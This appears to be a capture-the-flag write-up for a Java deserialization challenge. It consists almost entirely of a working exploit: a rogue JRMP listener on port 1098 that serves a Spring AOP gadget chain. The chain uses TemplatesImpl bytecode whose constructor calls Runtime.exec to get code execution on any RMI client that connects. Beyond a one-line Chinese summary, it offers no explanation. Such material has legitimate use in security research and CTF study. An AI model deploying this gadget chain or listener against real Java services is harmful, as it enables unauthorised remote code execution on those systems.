# JustDeserialize

spring-aop链到jndi，jrmp绕过

```java
package org.example;  
  
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;  
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;  
import javassist.ClassClassPath;  
import javassist.ClassPool;  
import javassist.CtClass;  
import javassist.CtConstructor;  
import org.aopalliance.aop.Advice;  
import org.aopalliance.intercept.MethodInterceptor;  
import org.example.Reflections;  
import org.springframework.aop.aspectj.AbstractAspectJAdvice;  
import org.springframework.aop.aspectj.AspectJAroundAdvice;  
import org.springframework.aop.aspectj.AspectJExpressionPointcut;  
import org.springframework.aop.aspectj.SingletonAspectInstanceFactory;  
import org.springframework.aop.framework.AdvisedSupport;  
import org.springframework.aop.support.DefaultIntroductionAdvisor;  
import sun.rmi.transport.TransportConstants;  
import javax.management.BadAttributeValueExpException;  
import javax.net.ServerSocketFactory;  
import java.io.*;  
import java.lang.reflect.*;  
import java.lang.reflect.Proxy;  
import java.net.*;  
import java.rmi.MarshalException;  
import java.rmi.server.ObjID;  
import java.rmi.server.UID;  
import java.util.Arrays;  
  
  
/**  
 * Generic JRMP listener * <p>  
 * Opens up an JRMP listener that will deliver the specified payload to any  
 * client connecting to it and making a call. * * @author mbechler  
 */@SuppressWarnings({  
        "restriction"  
})  
public class test implements Runnable {  
  
    private int port;  
    private Object payloadObject;  
    private ServerSocket ss;  
    private Object waitLock = new Object();  
    private boolean exit;  
    private boolean hadConnection;  
    private URL classpathUrl;  
  
  
    public test ( int port, Object payloadObject ) throws NumberFormatException, IOException {  
        this.port = port;  
        this.payloadObject = payloadObject;  
        this.ss = ServerSocketFactory.getDefault().createServerSocket(this.port);  
    }  
  
    public test (int port, String className, URL classpathUrl) throws IOException {  
        this.port = port;  
        this.payloadObject = makeDummyObject(className);  
        this.classpathUrl = classpathUrl;  
        this.ss = ServerSocketFactory.getDefault().createServerSocket(this.port);  
    }  
  
    public static void main(String[] args) throws Exception {  
  
//        if (args.length < 3) {  
//            System.err.println(JRMPListener.class.getName() + " <port> <payload_type> <payload_arg>");  
//            System.exit(-1);  
//            return;  
//        }  
        final Object payloadObject = makePayloadObject();  
  
        try {  
            int port = 1098;  
            System.err.println("* Opening JRMP listener on " + port);  
            test c = new test(port, payloadObject);  
            c.run();  
        } catch (Exception e) {  
            System.err.println("Listener error");  
            e.printStackTrace(System.err);  
        }  
    }  
  
    private static Object makePayloadObject() throws Exception {  
        ClassPool pool = ClassPool.getDefault();  
        CtClass clazz = pool.makeClass("a");  
        CtClass superClass = pool.get(AbstractTranslet.class.getName());  
        clazz.setSuperclass(superClass);  
        CtConstructor constructor = new CtConstructor(new CtClass[]{}, clazz);  
        constructor.setBody("Runtime.getRuntime().exec(\"calc\");");  
        clazz.addConstructor(constructor);  
        byte[][] bytes = new byte[][]{clazz.toBytecode()};  
        TemplatesImpl templates = TemplatesImpl.class.newInstance();  
        setValue(templates, "_bytecodes", bytes);  
        setValue(templates, "_name", "test");  
        setValue(templates, "_tfactory", null);  
        Method method=templates.getClass().getMethod("newTransformer");//获取newTransformer方法  
  
        SingletonAspectInstanceFactory factory = new SingletonAspectInstanceFactory(templates);  
        AspectJAroundAdvice advice = new AspectJAroundAdvice(method,new AspectJExpressionPointcut(),factory);  
        java.lang.reflect.Proxy proxy1 = (Proxy) getAProxy(advice, Advice.class);  
  
        BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(123);  
        setValue(badAttributeValueExpException, "val", proxy1);  
  
        return badAttributeValueExpException;  
    }  
    public static Object getBProxy(Object obj,Class[] clazzs) throws Exception  
    {  
        AdvisedSupport advisedSupport = new AdvisedSupport();  
        advisedSupport.setTarget(obj);  
        Constructor constructor = Class.forName("org.springframework.aop.framework.JdkDynamicAopProxy").getConstructor(AdvisedSupport.class);  
        constructor.setAccessible(true);  
        InvocationHandler handler = (InvocationHandler) constructor.newInstance(advisedSupport);  
        Object proxy = Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), clazzs, handler);  
        return proxy;  
    }  
    public static Object getAProxy(Object obj,Class<?> clazz) throws Exception  
    {  
        AdvisedSupport advisedSupport = new AdvisedSupport();  
        advisedSupport.setTarget(obj);  
        AbstractAspectJAdvice advice = (AbstractAspectJAdvice) obj;  
  
        DefaultIntroductionAdvisor advisor = new DefaultIntroductionAdvisor((Advice) getBProxy(advice, new Class[]{MethodInterceptor.class, Advice.class}));  
        advisedSupport.addAdvisor(advisor);  
        Constructor constructor = Class.forName("org.springframework.aop.framework.JdkDynamicAopProxy").getConstructor(AdvisedSupport.class);  
        constructor.setAccessible(true);  
        InvocationHandler handler = (InvocationHandler) constructor.newInstance(advisedSupport);  
        Object proxy = Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), new Class[]{clazz}, handler);  
        return proxy;  
    }  
    public static void setValue(Object obj,String fieldName,Object value) throws Exception {  
        Field field = obj.getClass().getDeclaredField(fieldName);  
        field.setAccessible(true);  
        field.set(obj,value);  
    }  
  
    @SuppressWarnings({"deprecation"})  
    protected static Object makeDummyObject(String className) {  
        try {  
            ClassLoader isolation = new ClassLoader() {  
            };  
            ClassPool cp = new ClassPool();  
            cp.insertClassPath(new ClassClassPath(Dummy.class));  
            CtClass clazz = cp.get(Dummy.class.getName());  
            clazz.setName(className);  
            return clazz.toClass(isolation).newInstance();  
        } catch (Exception e) {  
            e.printStackTrace();  
            return new byte[0];  
        }  
    }  
  
    public boolean waitFor(int i) {  
        try {  
            if (this.hadConnection) {  
                return true;  
            }  
            System.err.println("Waiting for connection");  
            synchronized (this.waitLock) {  
                this.waitLock.wait(i);  
            }  
            return this.hadConnection;  
        } catch (InterruptedException e) {  
            return false;  
        }  
    }  
  
    /**  
     *     */    public void close() {  
        this.exit = true;  
        try {  
            this.ss.close();  
        } catch (IOException e) {  
        }  
        synchronized (this.waitLock) {  
            this.waitLock.notify();  
        }  
    }  
  
    public void run() {  
        try {  
            Socket s = null;  
            try {  
                while (!this.exit && (s = this.ss.accept()) != null) {  
                    try {  
                        s.setSoTimeout(5000);  
                        InetSocketAddress remote = (InetSocketAddress) s.getRemoteSocketAddress();  
                        System.err.println("Have connection from " + remote);  
  
                        InputStream is = s.getInputStream();  
                        InputStream bufIn = is.markSupported() ? is : new BufferedInputStream(is);  
  
                        // Read magic (or HTTP wrapper)  
                        bufIn.mark(4);  
                        DataInputStream in = new DataInputStream(bufIn);  
                        int magic = in.readInt();  
  
                        short version = in.readShort();  
                        if (magic != TransportConstants.Magic || version != TransportConstants.Version) {  
                            s.close();  
                            continue;  
                        }  
  
                        OutputStream sockOut = s.getOutputStream();  
                        BufferedOutputStream bufOut = new BufferedOutputStream(sockOut);  
                        DataOutputStream out = new DataOutputStream(bufOut);  
  
                        byte protocol = in.readByte();  
                        switch (protocol) {  
                            case TransportConstants.StreamProtocol:  
                                out.writeByte(TransportConstants.ProtocolAck);  
                                if (remote.getHostName() != null) {  
                                    out.writeUTF(remote.getHostName());  
                                } else {  
                                    out.writeUTF(remote.getAddress().toString());  
                                }  
                                out.writeInt(remote.getPort());  
                                out.flush();  
                                in.readUTF();  
                                in.readInt();  
                            case TransportConstants.SingleOpProtocol:  
                                doMessage(s, in, out, this.payloadObject);  
                                break;  
                            default:  
                            case TransportConstants.MultiplexProtocol:  
                                System.err.println("Unsupported protocol");  
                                s.close();  
                                continue;  
                        }  
  
                        bufOut.flush();  
                        out.flush();  
                    } catch (InterruptedException e) {  
                        return;  
                    } catch (Exception e) {  
                        e.printStackTrace(System.err);  
                    } finally {  
                        System.err.println("Closing connection");  
                        s.close();  
                    }  
  
                }  
  
            } finally {  
                if (s != null) {  
                    s.close();  
                }  
                if (this.ss != null) {  
                    this.ss.close();  
                }  
            }  
  
        } catch (SocketException e) {  
            return;  
        } catch (Exception e) {  
            e.printStackTrace(System.err);  
        }  
    }  
  
    private void doMessage(Socket s, DataInputStream in, DataOutputStream out, Object payload) throws Exception {  
        System.err.println("Reading message...");  
  
        int op = in.read();  
  
        switch (op) {  
            case TransportConstants.Call:  
                // service incoming RMI call  
                doCall(in, out, payload);  
                break;  
  
            case TransportConstants.Ping:  
                // send ack for ping  
                out.writeByte(TransportConstants.PingAck);  
                break;  
  
            case TransportConstants.DGCAck:  
                UID u = UID.read(in);  
                break;  
  
            default:  
                throw new IOException("unknown transport op " + op);  
        }  
  
        s.close();  
    }  
  
    private void doCall(DataInputStream in, DataOutputStream out, Object payload) throws Exception {  
        ObjectInputStream ois = new ObjectInputStream(in) {  
  
            @Override  
            protected Class<?> resolveClass(ObjectStreamClass desc) throws IOException, ClassNotFoundException {  
                if ("[Ljava.rmi.server.ObjID;".equals(desc.getName())) {  
                    return ObjID[].class;  
                } else if ("java.rmi.server.ObjID".equals(desc.getName())) {  
                    return ObjID.class;  
                } else if ("java.rmi.server.UID".equals(desc.getName())) {  
                    return UID.class;  
                }  
                throw new IOException("Not allowed to read object");  
            }  
        };  
  
        ObjID read;  
        try {  
            read = ObjID.read(ois);  
        } catch (java.io.IOException e) {  
            throw new MarshalException("unable to read objID", e);  
        }  
  
  
        if (read.hashCode() == 2) {  
            ois.readInt(); // method  
            ois.readLong(); // hash  
            System.err.println("Is DGC call for " + Arrays.toString((ObjID[]) ois.readObject()));  
        }  
  
        System.err.println("Sending return with payload for obj " + read);  
  
        out.writeByte(TransportConstants.Return);// transport op  
        ObjectOutputStream oos = new MarshalOutputStream(out, this.classpathUrl);  
  
        oos.writeByte(TransportConstants.ExceptionalReturn);  
        new UID().write(oos);  
  
        BadAttributeValueExpException ex = new BadAttributeValueExpException(null);  
        Reflections.setFieldValue(ex, "val", payload);  
        oos.writeObject(ex);  
  
        oos.flush();  
        out.flush();  
  
        this.hadConnection = true;  
        synchronized (this.waitLock) {  
            this.waitLock.notifyAll();  
        }  
    }  
  
    public static class Dummy implements Serializable {  
        private static final long serialVersionUID = 1L;  
  
    }  
  
    static final class MarshalOutputStream extends ObjectOutputStream {  
  
  
        private URL sendUrl;  
  
        public MarshalOutputStream(OutputStream out, URL u) throws IOException {  
            super(out);  
            this.sendUrl = u;  
        }  
  
        MarshalOutputStream(OutputStream out) throws IOException {  
            super(out);  
        }  
  
        @Override  
        protected void annotateClass(Class<?> cl) throws IOException {  
            if (this.sendUrl != null) {  
                writeObject(this.sendUrl.toString());  
            } else if (!(cl.getClassLoader() instanceof URLClassLoader)) {  
                writeObject(null);  
            } else {  
                URL[] us = ((URLClassLoader) cl.getClassLoader()).getURLs();  
                String cb = "";  
  
                for (URL u : us) {  
                    cb += u.toString();  
                }  
                writeObject(cb);  
            }  
        }  
  
  
        /**  
         * Serializes a location from which to load the specified class.         */        @Override  
        protected void annotateProxyClass(Class<?> cl) throws IOException {  
            annotateClass(cl);  
        }  
    }  
}
```

